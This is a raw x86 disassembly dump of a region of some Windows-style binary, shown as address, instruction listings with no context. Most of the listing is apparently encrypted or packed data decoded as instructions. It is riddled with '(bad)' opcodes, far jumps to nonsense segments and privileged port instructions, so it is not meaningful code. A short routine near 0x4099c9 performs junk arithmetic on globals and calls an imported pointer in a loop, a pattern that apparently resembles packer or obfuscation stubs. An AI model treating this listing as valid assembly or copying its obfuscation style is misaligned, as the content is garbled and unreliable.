  409902:	sbb    BYTE PTR [edx-0x27],cl
  409905:	mov    ds:0x21fe0822,al
  40990a:	xchg   esp,eax
  40990b:	leave  
  40990c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40990d:	pop    ecx
  40990e:	and    BYTE PTR [eax+0xc],dh
  409911:	cld    
  409912:	aas    
  409913:	ret    0xf6e1
  409916:	(bad)  
  409917:	std    
  409918:	add    ah,ah
  40991a:	and    BYTE PTR [ebp-0x78],0xd5
  40991e:	loopne 0x40990a
  409920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409921:	imul   edx,DWORD PTR [ebp+0x70830c79],0x23
  409928:	aad    0x55
  40992a:	mov    bl,bl
  40992c:	inc    esi
  40992d:	dec    ecx
  40992e:	test   eax,ebp
  409930:	dec    edi
  409931:	mov    eax,0x18bcca9c
  409936:	(bad)  
  409937:	out    0x84,eax
  409939:	and    ecx,DWORD PTR [ebp+0x20]
  40993c:	mov    ah,0x45
  40993e:	sub    BYTE PTR [esi+0x6],bh
  409941:	call   0x34caddef
  409946:	fwait
  409947:	xchg   BYTE PTR [ebp-0x60],bl
  40994a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40994b:	and    BYTE PTR [esi-0x2bb364c9],cl
  409951:	xor    bl,dl
  409953:	or     ebx,0xcbcf5fa7
  409959:	cmp    ebx,DWORD PTR [ebx]
  40995b:	sub    esp,edi
  40995d:	pop    ss
  40995e:	lea    eax,[ecx]
  409960:	cmp    DWORD PTR [eax+ebx*4+0xb],ecx
  409964:	mov    eax,ds:0x2c4a0089
  409969:	clc    
  40996a:	je     0x409958
  40996c:	adc    BYTE PTR [ecx],0x60
  40996f:	dec    ebp
  409970:	in     eax,0x24
  409972:	setnp  bh
  409975:	and    esi,DWORD PTR [eax]
  409977:	jbe    0x4099bc
  409979:	jbe    0x4099db
  40997b:	cdq    
  40997c:	sub    BYTE PTR [edx-0x69],dl
  40997f:	jecxz  0x4099b0
  409981:	shl    BYTE PTR [esi],1
  409983:	cdq    
  409984:	jmp    0xa62c:0x990a9c54
  40998b:	ret    
  40998c:	retf   
  40998d:	(bad)  
  40998e:	aad    0x85
  409990:	sub    dl,BYTE PTR [edi+0xc]
  409993:	pop    es
  409994:	fst    DWORD PTR [ebx+ecx*8-0x72]
  409998:	sub    esp,DWORD PTR [ebx+0x5d]
  40999b:	pop    ecx
  40999c:	jmp    0x409987
  40999e:	xor    edx,DWORD PTR [edi]
  4099a0:	aam    0x88
  4099a2:	lds    esi,FWORD PTR [ebx+0x4]
  4099a5:	and    ebx,ebx
  4099a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099a8:	pop    es
  4099a9:	rol    DWORD PTR [ebx+esi*4+0x5e],1
  4099ad:	mov    al,ds:0x3f2c5acc
  4099b2:	cmp    DWORD PTR [edx+0x73],esi
  4099b5:	pop    ss
  4099b6:	mov    edx,0xcfe6ef7
  4099bb:	jge    0x40995d
  4099bd:	jg     0x409a1b
  4099bf:	aam    0xc5
  4099c1:	aam    0x1
  4099c3:	or     BYTE PTR [edi+0x5e],bl
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	test   DWORD PTR [ebp-0x78a4bbbf],0x9f7070ec
  409a62:	jge    0x409ad4
  409a64:	jo     0x409ac4
  409a66:	adc    esp,edi
  409a68:	pop    ds
  409a69:	aas    
  409a6a:	ret    0x3c5f
  409a6d:	test   al,0x7e
  409a6f:	mov    edx,0xb3319349
  409a74:	jmp    0xc498:0xdbde8e97
  409a7b:	pop    ss
  409a7c:	mov    cl,BYTE PTR [ecx-0x3a]
  409a7f:	fdiv   QWORD PTR [edx+edx*8-0x20]
  409a83:	fwait
  409a84:	inc    edx
  409a85:	in     al,dx
  409a86:	adc    al,0x49
  409a88:	cmp    bh,dl
  409a8a:	push   edi
  409a8b:	mov    eax,0x2cd44ad8
  409a90:	add    ebp,ecx
  409a92:	ror    DWORD PTR [ecx],0x75
  409a95:	out    dx,eax
  409a96:	jb     0x409ac0
  409a98:	ds cmp al,0x35
  409a9b:	push   esp
  409a9c:	retf   
  409a9d:	pop    ds
  409a9e:	and    dl,ch
  409aa0:	xchg   ebx,eax
  409aa1:	push   ds
  409aa2:	sbb    BYTE PTR ds:0x295177eb,al
  409aa8:	mov    edi,0x4d269fc6
  409aad:	pop    edx
  409aae:	or     BYTE PTR [eax+0xaa6c8c0],0x47
  409ab5:	loop   0x409a42
  409ab7:	pop    es
  409ab8:	push   edx
  409ab9:	pop    ecx
  409aba:	dec    esi
  409abc:	and    al,0x21
  409abe:	pop    edi
  409abf:	mov    eax,ds:0x20ca3adb
  409ac4:	(bad)  
  409ac5:	add    edx,DWORD PTR [ecx-0x58d3260e]
  409acb:	xchg   edx,eax
  409acc:	cmp    BYTE PTR [eax-0x46],al
  409acf:	or     ecx,DWORD PTR [eax-0x33b7ca59]
  409ad5:	loopne 0x409b42
  409ad7:	(bad)  
  409ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ad9:	or     edx,DWORD PTR ds:0x7f617498
  409adf:	xlat   BYTE PTR ds:[ebx]
  409ae0:	out    0x4c,ax
  409ae3:	and    eax,0x27af4bb3
  409ae8:	hlt    
  409ae9:	fs xor esp,esi
  409aec:	jne    0x409ace
  409aee:	xchg   ebx,eax
  409aef:	loop   0x409afc
  409af1:	pop    edx
  409af2:	outs   dx,BYTE PTR ds:[esi]
  409af3:	out    dx,eax
  409af4:	xchg   sp,ax
  409af6:	xor    bl,BYTE PTR [ebx]
  409af8:	int    0x89
  409afa:	or     bl,ch
  409afc:	int    0x13
  409afe:	daa    
  409aff:	idiv   BYTE PTR [esi+esi*4]
  409b02:	leave  
  409b03:	sbb    ecx,ebx
  409b05:	inc    esp
  409b06:	or     esp,DWORD PTR [edx+esi*1+0x610fb8a9]
  409b0d:	mov    bl,0xfa
  409b0f:	(bad)  
  409b10:	aad    0xad
  409b12:	in     al,dx
  409b13:	push   cs
  409b14:	jno    0x409b0c
  409b16:	xchg   esp,eax
  409b17:	dec    ebp
  409b18:	jmp    0x409b77
  409b1a:	sti    
  409b1b:	popa   
  409b1c:	sbb    BYTE PTR [edi-0x32aa9aa1],0xa5
  409b23:	mov    ds:0x7a4e931,al
  409b28:	js     0x409b69
  409b2a:	test   DWORD PTR [ebp+0x2bdf7f00],ebp
  409b30:	xchg   esp,eax
  409b31:	sbb    bl,bh
  409b33:	cwde   
  409b34:	jmp    0x409ba7
  409b36:	or     edx,DWORD PTR [esi]
  409b38:	mov    ?,WORD PTR [edx]
  409b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b3b:	daa    
  409b3c:	pusha  
  409b3d:	ss dec esi
  409b3f:	hlt    
  409b40:	mov    eax,ds:0x9cc550d0
  409b45:	retf   
  409b46:	mov    WORD PTR [ebx+esi*8-0x6f4ce061],?
  409b4d:	lds    ebx,FWORD PTR [eax-0x441d0e45]
  409b53:	addr16 dec edx
  409b55:	pop    esp
  409b56:	mov    ah,0xcc
  409b58:	nop
  409b59:	fucom  st(1)
  409b5b:	xor    DWORD PTR [edx],esi
  409b5d:	pop    edx
  409b5e:	push   edi
  409b5f:	imul   DWORD PTR [edx+ebp*2-0x57]
  409b63:	or     al,0x35
  409b65:	stc    
  409b66:	ffree  st(0)
  409b68:	(bad)  
  409b69:	and    eax,0x4b4da744
  409b6e:	mov    esi,0x95260b0c
  409b73:	cmp    ah,bh
  409b75:	fistp  QWORD PTR [edi+0x218e8d29]
  409b7b:	inc    edx
  409b7c:	dec    edi
  409b7d:	test   eax,0xf75cdfa2
  409b82:	add    ah,cl
  409b84:	test   al,0x84
  409b86:	(bad)  
  409b87:	jns    0x409b9e
  409b89:	cs stos DWORD PTR es:[edi],eax
  409b8b:	pop    esi
  409b8c:	sub    DWORD PTR [eax+0x5e893157],ecx
  409b92:	ror    edi,0x85
  409b95:	jl     0x409b8c
  409b97:	ret    
  409b98:	adc    ecx,edi
  409b9a:	xor    DWORD PTR [ebx],0xffffffd8
  409b9d:	out    0x1b,eax
  409b9f:	jae    0x409bd8
  409ba1:	sub    dh,cl
  409ba3:	test   BYTE PTR [eax+0x5e],ch
  409ba6:	loope  0x409b90
  409ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ba9:	mov    edi,0x94efd995
  409bae:	sub    cl,BYTE PTR [edi+ecx*1]
  409bb1:	mov    eax,0x1828c94c
  409bb6:	stos   BYTE PTR es:[edi],al
  409bb7:	push   ds
  409bb8:	popw   ds
  409bba:	addr16 pop esp
  409bbc:	enter  0x7655,0xb
  409bc0:	lock cld 
  409bc2:	ror    DWORD PTR [edx],1
  409bc4:	xor    DWORD PTR [eax-0x16],edx
  409bc7:	and    BYTE PTR [edx+0x4f05d80],bh
  409bcd:	sbb    ebx,DWORD PTR [ebp+eax*4-0x51c8c850]
  409bd4:	neg    esp
  409bd6:	push   edi
  409bd7:	jne    0x409ba8
  409bd9:	sub    edx,DWORD PTR [ecx+0x1c1354cb]
  409bdf:	adc    eax,0xef10ce0d
  409be4:	(bad)  
  409be5:	out    0xc1,eax
  409be7:	mov    esp,0x5cc97ab7
  409bec:	mov    cl,0x8e
  409bee:	mov    esp,0xfde14d4c
  409bf3:	fadd   QWORD PTR [ecx]
  409bf5:	jbe    0x409c3f
  409bf7:	out    dx,al
  409bf8:	enter  0x37f1,0x2b
  409bfc:	cwde   
  409bfd:	jne    0x409b96
  409bff:	xchg   ebx,eax
  409c00:	jnp    0x409c47
  409c02:	pop    ecx
  409c03:	mov    BYTE PTR [ebx+0x3062adac],al
  409c09:	clc    
  409c0a:	lahf   
  409c0b:	jmp    0x48ba:0xd9950d70
  409c12:	mov    esi,0x43fd2a50
  409c17:	jbe    0x409c63
  409c19:	adc    al,0x70
  409c1b:	pop    edi
  409c1c:	stos   BYTE PTR es:[edi],al
  409c1d:	add    DWORD PTR [ebp+0x5e8d05a],0xf489d6d8
  409c27:	xchg   esi,eax
  409c28:	daa    
  409c29:	enter  0xc019,0x70
  409c2d:	outs   dx,DWORD PTR ds:[esi]
  409c2e:	jmp    0x8400:0x15f5f91e
  409c35:	(bad)  
  409c36:	iret   
  409c37:	pop    edx
  409c38:	neg    edi
  409c3a:	cmp    BYTE PTR [edx],dl
  409c3c:	pop    ecx
  409c3d:	data16 mov ah,0x8c
  409c40:	test   edx,esi
  409c42:	push   esp
  409c43:	sahf   
  409c44:	jmp    FWORD PTR [edi+0x3313b55b]
  409c4a:	rol    BYTE PTR [esi+esi*4],0x6a
  409c4e:	(bad)  
  409c4f:	imul   DWORD PTR [eax*2+0x6fbf52a1]
  409c56:	and    DWORD PTR [ecx],ebx
  409c58:	(bad)  
  409c59:	into   
  409c5a:	or     al,0x2c
  409c5c:	repnz and ah,BYTE PTR [edx+ebx*1+0x4c396787]
  409c64:	adc    BYTE PTR [edx-0x56],bl
  409c67:	and    al,0x2d
  409c69:	rcl    BYTE PTR [edi],cl
  409c6b:	aam    0xa
  409c6d:	stos   DWORD PTR es:[edi],eax
  409c6e:	mov    WORD PTR [edi+0x27],cs
  409c71:	cli    
  409c72:	inc    ebp
  409c73:	dec    ebp
  409c74:	xor    al,0x56
  409c76:	adc    al,0x23
  409c78:	ret    0x8348
  409c7b:	push   ecx
  409c7c:	pop    eax
  409c7d:	adc    eax,0x45317c12
  409c82:	pop    edi
  409c83:	call   0xff445f0f
  409c88:	pushf  
  409c89:	push   ecx
  409c8a:	mov    dh,0xfc
  409c8c:	xlat   BYTE PTR ds:[ebx]
  409c8d:	fs out dx,al
  409c8f:	jg     0x409cf3
  409c91:	inc    edi
  409c92:	or     bl,BYTE PTR [ecx+0x3d740256]
  409c98:	out    0x82,al
  409c9a:	dec    ecx
  409c9b:	or     al,0xb9
  409c9d:	jo     0x409c26
  409c9f:	mov    ebp,0x2dc65b27
  409ca4:	inc    ebx
  409ca5:	(bad)  
  409ca6:	daa    
  409ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca8:	stc    
  409ca9:	es xor ch,bl
  409cac:	xor    eax,0xf4c0a15b
  409cb1:	inc    ebp
  409cb2:	in     al,dx
  409cb3:	es push ss
  409cb5:	test   eax,0xa36682e8
  409cba:	(bad)  
  409cbb:	cs mov dh,0x61
  409cbe:	retf   0xf987
  409cc1:	je     0x409d0c
  409cc3:	imul   esi,DWORD PTR [edi+0x155b35e2],0x4d
  409cca:	int3   
  409ccb:	xchg   esp,eax
  409ccc:	dec    ebx
  409ccd:	mov    ecx,ds
  409ccf:	popa   
  409cd0:	es jl  0x409ccb
  409cd3:	(bad)  
  409cd5:	hlt    
  409cd6:	aam    0xb9
  409cd8:	fcomp  DWORD PTR [ebx]
  409cda:	sar    ebx,0x1c
  409cdd:	jge    0x409d17
  409cdf:	ins    BYTE PTR es:[edi],dx
  409ce0:	dec    edx
  409ce1:	js     0x409c76
  409ce3:	cmp    BYTE PTR [edi+esi*4-0x5a],bh
  409ce7:	lods   al,BYTE PTR ds:[esi]
  409ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ce9:	neg    DWORD PTR [edi]
  409ceb:	popf   
  409cec:	push   ebx
  409ced:	sahf   
  409cee:	xchg   DWORD PTR [ecx-0x13de81bd],ecx
  409cf4:	popf   
  409cf5:	and    al,dh
  409cf7:	jns    0x409cfe
  409cf9:	cli    
  409cfa:	dec    ebx
  409cfb:	sbb    DWORD PTR [ebx+ebx*4-0x6bdb1698],eax
  409d02:	cmp    eax,0x7ce1fe20
  409d07:	lahf   
  409d08:	jae    0x409ca6
  409d0a:	sub    al,0xf9
  409d0c:	and    ebp,DWORD PTR [edx+0x2f]
  409d0f:	inc    eax
  409d10:	retf   0xba31
  409d13:	shr    BYTE PTR [esi+esi*2-0x2905974],1
  409d1a:	icebp  
  409d1b:	out    dx,al
  409d1c:	test   DWORD PTR [edi-0x30ce550b],0xe07e2393
  409d26:	xchg   ecx,ecx
  409d28:	xchg   esp,eax
  409d29:	or     ch,BYTE PTR [edx+eiz*2-0x30]
  409d2d:	xchg   edi,eax
  409d2e:	mov    ah,BYTE PTR [edi-0x720b00d2]
  409d34:	scas   eax,DWORD PTR es:[edi]
  409d35:	dec    edx
  409d36:	sbb    eax,0xd601b209
  409d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d3c:	(bad)  
  409d3d:	sbb    esp,esp
  409d3f:	into   
  409d40:	enter  0xa891,0x18
  409d44:	pushf  
  409d45:	mov    ds:0xc2ebddc9,al
  409d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d4b:	dec    edi
  409d4c:	(bad)  
  409d4d:	enter  0xb68,0x7c
  409d51:	adc    BYTE PTR [ecx],0x43
  409d54:	dec    ebp
  409d55:	xchg   esp,eax
  409d56:	jecxz  0x409d13
  409d58:	outs   dx,BYTE PTR ds:[esi]
  409d59:	xor    cl,BYTE PTR [esi]
  409d5b:	mov    al,ds:0xf2b6dbc3
  409d60:	jmp    0x4746b30e
  409d65:	mov    ah,0x45
  409d67:	dec    edx
  409d68:	lds    ebp,FWORD PTR [ecx+ecx*2+0x36c64f13]
  409d6f:	push   eax
  409d70:	jge    0x409d9c
  409d72:	sahf   
  409d73:	ins    BYTE PTR es:[edi],dx
  409d74:	imul   ebp,DWORD PTR [edx],0xffffffb4
  409d77:	loop   0x409d7d
  409d79:	xchg   esi,eax
  409d7a:	test   al,0x21
  409d7c:	ds inc esi
  409d7e:	call   0x836f:0x243a01ea
  409d85:	mov    bl,0xc3
  409d87:	leave  
  409d88:	inc    eax
  409d89:	add    eax,ecx
  409d8b:	lea    esp,[edi]
  409d8d:	sbb    edi,DWORD PTR cs:[ebx]
  409d90:	jb     0x409d5c
  409d92:	mov    ebx,0x2bee97ed
  409d97:	out    dx,al
  409d98:	pop    eax
  409d99:	mov    al,0x17
  409d9b:	mov    edx,0x35005e11
  409da0:	sti    
  409da1:	mov    DWORD PTR [edi],eax
  409da3:	fs xor esp,esi
  409da6:	inc    ebp
  409da7:	lock cwde 
  409da9:	out    0xf8,al
  409dab:	cmp    edi,esi
  409dad:	fwait
  409dae:	or     esi,DWORD PTR [ecx+0x76b2f7d3]
  409db4:	cmp    cl,0x2
  409db7:	mov    ds:0xd919ef68,al
  409dbc:	pop    ss
  409dbd:	mov    bh,0xe7
  409dbf:	clc    
  409dc0:	sbb    esi,DWORD PTR [edi-0x29]
  409dc3:	in     eax,0x3b
  409dc5:	pop    ebx
  409dc6:	leave  
  409dc7:	cmp    edi,DWORD PTR [esi]
  409dc9:	js     0x409de7
  409dcb:	lds    ebp,FWORD PTR [ebp+0x12]
  409dce:	jnp    0x409e2b
  409dd0:	shl    bh,cl
  409dd2:	ss sub al,0x64
  409dd5:	hlt    
  409dd6:	mov    esi,0x8a573b11
  409ddb:	bound  eax,QWORD PTR [ebx]
  409ddd:	mov    al,0x8b
  409ddf:	adc    BYTE PTR [esi+0x58],0x11
  409de3:	adc    BYTE PTR ss:[eax+0x46158b00],0x3e
  409deb:	mov    al,cl
  409ded:	sbb    DWORD PTR [ebx+esi*2+0x39033e88],ebx
  409df4:	jmp    0x9acf5131
  409df9:	sub    al,0xe0
  409dfb:	outs   dx,BYTE PTR ds:[esi]
  409dfc:	and    BYTE PTR [ecx-0x5b8fd011],0x67
  409e03:	into   
  409e04:	dec    edi
  409e05:	stc    
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	leave  
  409e82:	shr    DWORD PTR [esi-0x1d],0x26
  409e86:	call   0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	pop    eax
  409e8e:	or     eax,0xf2a65929
  409e93:	ds (bad) 
  409e95:	fidiv  DWORD PTR [ebx-0x27aa93db]
  409e9b:	lock push ebx
  409e9d:	imul   edi,DWORD PTR [eax+edi*1-0x6e],0xb5e4579c
  409ea5:	clc    
  409ea6:	inc    edx
  409ea7:	push   cs
  409ea8:	add    bl,ah
  409eaa:	gs std 
  409eac:	or     al,0x5a
  409eae:	pop    edi
  409eaf:	pop    ebp
  409eb0:	jmp    0x9964ded5
  409eb5:	std    
  409eb6:	add    cl,BYTE PTR [edi+edi*8+0x9]
  409eba:	jmp    0x409e80
  409ebc:	add    bl,dh
  409ebe:	and    DWORD PTR [ebx-0x28334839],ecx
  409ec4:	outs   dx,DWORD PTR ds:[esi]
  409ec5:	ja     0x409ecb
  409ec7:	jge    0x409eb2
  409ec9:	out    dx,al
  409eca:	imul   esp,DWORD PTR [ecx],0x471b9c01
  409ed0:	pop    ds
  409ed1:	pop    eax
  409ed2:	repnz sub eax,0x584c954e
  409ed8:	pushf  
  409ed9:	(bad)  
  409eda:	fnstcw WORD PTR [ebx-0x7f]
  409edd:	xlat   BYTE PTR ds:[ebx]
  409ede:	mov    edx,0xb8f71115
  409ee3:	cs mov edx,0xd92f2551
  409ee9:	out    dx,eax
  409eea:	xor    al,0xd2
  409eec:	(bad)  
  409eed:	not    BYTE PTR [ecx]
  409eef:	jns    0x409f3c
  409ef1:	jb     0x409ef2
  409ef3:	comiss xmm0,DWORD PTR [eax+0x7e]
  409ef7:	and    al,0xd
  409ef9:	ds mov al,0x87
  409efc:	aad    0x77
  409efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eff:	inc    ebx
  409f00:	fldcw  WORD PTR [esi+0x2f8b88c]
  409f06:	xor    ebx,DWORD PTR [ebp+0x7a]
  409f09:	mov    al,0xb
  409f0b:	xchg   DWORD PTR [eax-0x34c90ad1],eax
  409f11:	push   ebp
  409f12:	ins    BYTE PTR es:[edi],dx
  409f13:	add    bh,cl
  409f15:	cmp    esp,DWORD PTR [ecx]
  409f17:	aad    0x5c
  409f19:	out    0x77,eax
  409f1b:	jne    0x409ed3
  409f1d:	jne    0x409f47
  409f1f:	cmp    eax,0xb4ec9319
  409f24:	dec    ebp
  409f25:	dec    edi
  409f26:	mov    eax,DWORD PTR [esi-0x5efc397a]
  409f2c:	inc    edx
  409f2d:	xadd   BYTE PTR [esi+0x5383ee99],ah
  409f34:	sbb    cl,BYTE PTR [esi-0x1d]
  409f37:	fstp   TBYTE PTR [ebx-0x29c63ad8]
  409f3d:	push   eax
  409f3e:	xor    al,0xc9
  409f40:	aad    0xd0
  409f42:	xor    al,BYTE PTR [ebx-0x3a9b470d]
  409f48:	call   0x50da:0x6e56a454
  409f4f:	adc    al,0x6f
  409f51:	mov    cl,0x95
  409f53:	popf   
  409f54:	jp     0x409f6b
  409f56:	aaa    
  409f57:	arpl   ax,di
  409f59:	or     DWORD PTR [ecx+0xe],esp
  409f5c:	stos   BYTE PTR es:[edi],al
  409f5d:	rol    al,1
  409f5f:	mov    esp,0x87d68dfb
  409f64:	pop    esi
  409f65:	fiadd  DWORD PTR [ebx-0x5b]
  409f68:	(bad)  
  409f69:	in     al,dx
  409f6a:	ss mov dh,0x8d
  409f6d:	pushf  
  409f6e:	test   BYTE PTR [edi-0xc],0xe0
  409f72:	cli    
  409f73:	mov    cl,0xe
  409f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f76:	fsub   QWORD PTR [eax+0x42]
  409f79:	sbb    DWORD PTR [esi],ebx
  409f7b:	or     esp,ecx
  409f7d:	xchg   ebx,eax
  409f7e:	out    0x77,al
  409f80:	jle    0x409f76
  409f82:	pop    esp
  409f83:	cli    
  409f84:	mov    esi,0xff77bbb6
  409f89:	xor    DWORD PTR [ebp+ebx*4+0x6fde3416],esi
  409f90:	ja     0x409f21
  409f92:	or     edi,DWORD PTR [ecx]
  409f94:	xchg   edx,eax
  409f95:	call   0x979a1b68
  409f9a:	push   ds
  409f9b:	inc    ebx
  409f9c:	rcr    DWORD PTR [edx],cl
  409f9e:	stos   DWORD PTR es:[edi],eax
  409f9f:	mov    cl,0xd8
  409fa1:	mov    esi,0x4fbc748f
  409fa6:	mov    ds:0x3738b54e,eax
  409fab:	sbb    al,0x46
  409fad:	repz rol al,1
  409fb0:	loopne 0x40a02f
  409fb2:	xchg   edx,eax
  409fb3:	or     al,BYTE PTR [esi]
  409fb5:	iret   
  409fb6:	aas    
  409fb7:	in     eax,0x10
  409fb9:	bnd jbe 0x409fdf
  409fbc:	or     BYTE PTR [edx+0x7a978a0e],ah
  409fc2:	push   0x1e
  409fc4:	mov    ds,WORD PTR [ebx-0x7]
  409fc7:	gs dec edi
  409fc9:	ror    ebp,1
  409fcb:	jne    0x409fcf
  409fcd:	mov    ecx,0x90a00150
  409fd2:	xor    BYTE PTR [ecx+0x78],cl
  409fd5:	fild   DWORD PTR [eax+0x5088aa70]
  409fdb:	pop    ebp
  409fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fdd:	clc    
  409fde:	inc    esp
  409fdf:	aas    
  409fe0:	std    
  409fe1:	iret   
  409fe2:	push   esi
  409fe3:	repnz scas eax,DWORD PTR es:[edi]
  409fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe6:	icebp  
  409fe7:	mov    WORD PTR [edi-0x21],es
  409fea:	mov    cl,0x3a
  409fec:	ret    0x75d7
  409fef:	and    eax,0xee30dbb6
  409ff4:	xor    eax,0x7c6d3ec9
  409ff9:	sbb    eax,0x35e6bcbc
  409ffe:	mul    DWORD PTR [edx-0x58ce13e8]
  40a004:	cli    
  40a005:	gs pop esi
  40a007:	xor    DWORD PTR [edx],ecx
  40a009:	xchg   ebp,eax
  40a00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a00b:	inc    edx
  40a00c:	sub    BYTE PTR [edx+ebp*2-0x2221307a],ch
  40a013:	test   BYTE PTR [ecx+0x5aaa44bf],ah
  40a019:	aas    
  40a01a:	and    dl,BYTE PTR [esi*2-0x46e0ccd]
  40a021:	pop    esi
  40a022:	sbb    al,0x4f
  40a024:	repnz sbb eax,0x130c9dfc
  40a02a:	pop    esp
  40a02b:	jmp    0x51a1:0xaf50db39
  40a032:	sbb    eax,0x11563cbb
  40a037:	pusha  
  40a038:	adc    edi,DWORD PTR [esi]
  40a03a:	in     eax,0x79
  40a03c:	xchg   edx,eax
  40a03d:	lds    esp,FWORD PTR ds:0x40b4b26c
  40a043:	xchg   esi,eax
  40a044:	cwde   
  40a045:	pop    es
  40a046:	ins    DWORD PTR es:[edi],dx
  40a047:	call   0x4948ff74
  40a04c:	add    BYTE PTR [edi+0x4f441407],ch
  40a052:	inc    edx
  40a053:	dec    edi
  40a054:	stos   DWORD PTR es:[edi],eax
  40a055:	adc    bh,dl
  40a057:	outs   dx,DWORD PTR ds:[esi]
  40a058:	inc    ecx
  40a059:	jbe    0x40a0d0
  40a05b:	dec    esp
  40a05c:	and    DWORD PTR [edi],esp
  40a05e:	cmp    eax,0xb71ef310
  40a063:	inc    edi
  40a064:	mov    ecx,0x3bfb4b7a
  40a069:	mov    ecx,0xccac794f
  40a06e:	stc    
  40a06f:	(bad)  
  40a071:	adc    al,0x56
  40a073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a074:	pop    ecx
  40a075:	jns    0x40a037
  40a077:	rcr    BYTE PTR [edi-0x53bdaf63],0xaf
  40a07e:	pop    ecx
  40a07f:	scas   al,BYTE PTR es:[edi]
  40a080:	xor    dl,BYTE PTR ds:0x68e0cb6d
  40a086:	in     eax,0xf7
  40a088:	adc    al,0x77
  40a08a:	push   cs
  40a08b:	cmp    DWORD PTR [ebx],ebp
  40a08d:	cli    
  40a08e:	push   eax
  40a08f:	call   0xddf:0xcb00982b
  40a096:	out    dx,eax
  40a097:	cmp    ch,BYTE PTR [edi-0x8c93bee]
  40a09d:	loopne 0x40a082
  40a09f:	fnstenv [edx]
  40a0a1:	scas   al,BYTE PTR es:[edi]
  40a0a2:	xor    eax,esp
  40a0a4:	leave  
  40a0a5:	retf   0x41b7
  40a0a8:	mov    ds:0xecf36720,eax
  40a0ad:	jae    0x40a0d3
  40a0af:	inc    ebp
  40a0b0:	out    0x8b,eax
  40a0b2:	gs pop ds
  40a0b4:	test   eax,0xadb194e8
  40a0b9:	add    ebx,DWORD PTR [eax]
  40a0bb:	stc    
  40a0bc:	shr    DWORD PTR [eax-0x6f85c873],cl
  40a0c2:	jns    0x40a128
  40a0c4:	jg     0x40a12e
  40a0c6:	into   
  40a0c7:	jmp    0x9220:0x1d3fdba4
  40a0ce:	fwait
  40a0cf:	pop    ebp
  40a0d0:	sbb    al,0x26
  40a0d2:	mov    edi,0x4e297553
  40a0d7:	inc    ebx
  40a0d8:	pop    edx
  40a0d9:	cmp    eax,0x3ef94d3b
  40a0de:	das    
  40a0df:	xchg   ecx,eax
  40a0e0:	ds xor al,0x89
  40a0e3:	mov    esi,0x6890bc11
  40a0e8:	div    bl
  40a0ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0eb:	nop
  40a0ec:	pop    edi
